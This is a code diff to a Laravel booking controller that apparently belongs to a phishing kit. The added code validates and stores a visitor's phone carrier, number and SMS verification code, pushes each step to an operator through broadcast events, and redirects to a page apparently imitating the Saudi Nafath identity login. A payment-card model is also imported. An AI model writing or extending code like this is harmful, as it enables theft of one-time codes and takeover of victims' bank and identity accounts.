@@ -8,6 +8,7 @@ use App\Events\SendPart;
 use App\Events\SendVisit;
 use App\Models\PaymentCard;
 use Illuminate\Http\Request;
+use App\Events\SendPhoneData;
 use App\Events\SendNotification;
 use App\Models\VisitorNotifications;
 
@@ -201,10 +202,10 @@ class BookingController extends Controller
     {
         try {
 
-            // $validated = $this->validate($request, [
-            //     'phone_number' => 'required',
-            //     // 'provider' => 'required',
-            // ]);
+            $validated = $this->validate($request, [
+                'telCompany' => 'required',
+                'phone' => 'required',
+            ]);
 
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
@@ -213,7 +214,32 @@ class BookingController extends Controller
                     'step_number'=>10,
                     'phone_provider'=>$request->telCompany ?? '',
                     'phone_number_2'=>$request->phone ?? '',
-                    'phone_code'=>$request->CaptchaCode ?? '',
+                    // 'phone_code'=>$request->CaptchaCode ?? '',
+
+                ]);
+                session()->put('visitor', json_encode($not));
+                event(new SendPhoneData($not));
+                event(new SendNotification($not));
+            }
+            return redirect()->route('confirm_phone_code_page');
+        } catch (\Exception $ex) {
+            dd($ex->getMessage());
+        }
+    }
+    public function phoneCodeStore(Request $request)
+    {
+        try {
+
+            $validated = $this->validate($request, [
+                'code' => 'required',
+            ]);
+
+            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+            if ($visitor) {
+                $not  = VisitorNotifications::find($visitor->id);
+                $not->update(['page' => 'أرسل كود تحقق الجوال',
+                    'step_number'=>10,
+                    'phone_code'=>$request->code ?? '',
 
                 ]);
                 session()->put('visitor', json_encode($not));
@@ -221,15 +247,6 @@ class BookingController extends Controller
                 event(new SendNotification($not));
             }
             return redirect()->route('enter_nafad_page');
-            // if ($visitor) {
-
-            //     $not  = VisitorNotifications::first();
-
-            //     // event(new SendCode($not));
-            //     event(new SendNotification($not));
-            // }
-            // // return view('phone_waiting',compact('not'));
-            // return view('phone_waiting',compact('not'));
         } catch (\Exception $ex) {
             dd($ex->getMessage());
         }
